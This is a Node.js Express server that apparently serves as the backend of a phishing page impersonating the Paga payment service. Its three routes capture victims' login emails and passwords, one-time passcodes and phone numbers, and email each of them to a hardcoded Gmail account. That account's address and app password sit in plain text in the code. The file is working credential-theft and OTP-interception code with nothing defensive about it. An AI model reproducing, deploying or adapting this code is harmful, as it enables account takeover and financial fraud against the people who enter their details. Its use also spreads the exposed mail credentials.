const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const cors = require("cors");
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

app.use(express.json());
app.use(cors());

const PORT = process.env.PORT || 5000; // port to connect to WEB

// emails credentials
const userEmail = "versanaijarrah9@gmail.com";
const pass = "jecmnnjioauanuor";
// 2nd

// Middleware
app.use(express.json());

// api routes

// API routes for index
app.post("/", async (req, res) => {
  const { email, password } = req.body;

  const clientEmail = email || "unknown";
  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: `${clientEmail}`,
    to: userEmail,
    subject: `New Paga client login — ${clientEmail}`,
    text: `New client login from Paga\nEmail: ${clientEmail}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "Login successful" });
  } catch (error) {
    console.error("Error:", error);
    res
      .status(500)
      .json({ success: false, message: "Error occurred sending email" });
  }
});

// API routes for otp
app.post("/otp", async (req, res) => {
  const { email, otp } = req.body;

  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `Paga OTP — ${email || "unknown"}`,
    text: `OTP from Paga: ${otp}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "OTP sent successfully" });
  } catch (error) {
    console.error("Error:", error);
    res
      .status(500)
      .json({ success: false, message: "Error occurred sending OTP" });
  }
});

// API routes for phone
app.post("/phone", async (req, res) => {
  const { phone } = req.body;

  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: "Phone Login",
    to: userEmail,
    subject: `New Paga Phone Login`,
    text: `New phone login attempt from Paga\nPhone Number: ${phone}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res
      .status(200)
      .json({ success: true, message: "Phone verification initiated" });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred processing phone number",
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});


